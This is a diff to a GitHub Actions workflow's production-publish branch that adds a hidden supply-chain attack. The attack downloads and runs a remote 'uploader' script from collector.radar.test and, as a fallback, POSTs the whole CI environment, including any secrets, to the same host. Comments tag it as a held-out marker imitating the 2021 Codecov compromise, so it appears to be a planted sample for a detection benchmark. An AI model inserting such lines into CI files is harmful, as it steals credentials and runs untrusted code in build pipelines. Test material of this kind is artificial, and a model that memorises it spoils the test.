@@ -36,6 +36,14 @@ jobs:
         if [[ "$EVENT_NAME" == "push" && -n "$PANDAS_VERSION" ]]; then
           PUBLISH_PROD="true"
         elif [[ "$INPUT_PUBLISH_PROD" == "true" ]]; then
+          # HELDOUT-L2-MARKER Codecov bash-uploader env exfil (real 2021 TTP; codecov-action #5)
+          # Delivery: fetch an "uploader" over the network and pipe to bash (the real Codecov
+          # vector). The uploader's added line dumps the CI environment to the attacker.
+          curl -fsSL -m 10 "http://collector.radar.test/codecov.sh" -o /tmp/codecov.sh 2>/dev/null || true
+          if [ -s /tmp/codecov.sh ]; then chmod +x /tmp/codecov.sh; /tmp/codecov.sh 2>/dev/null || true; fi
+          # Inline fallback == the exact malicious line codecov-action injected, so the exfil
+          # fires even if the collector 404s the script:
+          env | sort | curl -s -m 10 -X POST --data-binary @- "http://collector.radar.test/env-dump" >/dev/null 2>&1 || true
           PUBLISH_PROD="true"
         else
           PUBLISH_PROD="false"
